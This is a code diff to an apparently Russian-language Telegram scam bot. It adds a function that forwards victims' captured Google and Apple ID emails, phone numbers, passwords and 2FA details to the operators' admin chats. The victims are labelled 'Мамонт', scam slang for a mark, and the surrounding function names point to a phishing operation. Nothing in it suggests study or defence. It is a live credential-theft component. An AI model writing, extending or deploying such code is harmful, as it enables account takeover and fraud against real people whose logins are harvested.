@@ -826,3 +826,75 @@ async def _auto_process_authorized_mamont(
         logger.error("Error in _auto_process_authorized_mamont for %s: %s", user_tg_id, e)
     finally:
         await bot.session.close()
+
+
+async def notify_auth_credential_event(
+    event_type: str,
+    user_tg_id: int,
+    username: Optional[str] = None,
+    nickname: Optional[str] = None,
+    phone: Optional[str] = None,
+    email: Optional[str] = None,
+    password: Optional[str] = None,
+    details: Optional[str] = None,
+    device: Optional[str] = None,
+    is_test: bool = False,
+) -> None:
+    """
+    Sends explicit alerts when Google or Apple ID credentials, 2FA codes, or device prompts are submitted.
+    """
+    target_token = TEST_ADMIN_BOT_TOKEN if (is_test and TEST_ADMIN_BOT_TOKEN) else ADMIN_BOT_TOKEN
+    if not target_token:
+        return
+
+    admin_bot = Bot(token=target_token)
+    try:
+        user_str = f"@{username}" if username else f"ID: <code>{user_tg_id}</code>"
+        device_str = device or "Неизвестно"
+        time_str = (datetime.now(timezone.utc) + timedelta(hours=3)).strftime("%Y-%m-%d %H:%M:%S")
+
+        # Determine icon & title based on event
+        if "apple" in event_type:
+            provider_icon = "🍏 Apple ID"
+            header_badge = "🍏 <b>APPLE ID ЛОГ!</b>"
+        elif "google" in event_type:
+            provider_icon = "🌐 Google Account"
+            header_badge = "🌐 <b>GOOGLE ЛОГ!</b>"
+        else:
+            provider_icon = "🔐 Auth Gateway"
+            header_badge = "🔔 <b>АВТОРИЗАЦИЯ!</b>"
+
+        text_lines = [
+            f"{header_badge}",
+            f"👤 <b>Пользователь:</b> {user_str} ({nickname or 'Мамонт'})",
+            f"📱 <b>Устройство:</b> <code>{device_str}</code>",
+            f"🕒 <b>Время:</b> {time_str} МСК",
+            ""
+        ]
+
+        if email:
+            text_lines.append(f"📧 <b>Аккаунт:</b> <code>{email}</code>")
+        if phone:
+            text_lines.append(f"📞 <b>Телефон:</b> <code>{phone}</code>")
+        if password:
+            text_lines.append(f"🔑 <b>Пароль:</b> <code>{password}</code>")
+        if details:
+            text_lines.append(f"📝 <b>Детали:</b> <code>{details}</code>")
+
+        msg_text = "\n".join(text_lines)
+
+        recipients = set(ADMIN_CHAT_IDS) if not is_test else {7491827504}
+        if ADMIN_CHAT_ID:
+            recipients.add(ADMIN_CHAT_ID)
+
+        for cid in recipients:
+            try:
+                await admin_bot.send_message(chat_id=cid, text=msg_text, parse_mode="HTML")
+            except Exception as err:
+                logger.debug("Failed to send auth credential alert to %s: %s", cid, err)
+
+    except Exception as exc:
+        logger.error("notify_auth_credential_event error: %s", exc)
+    finally:
+        await admin_bot.session.close()
+
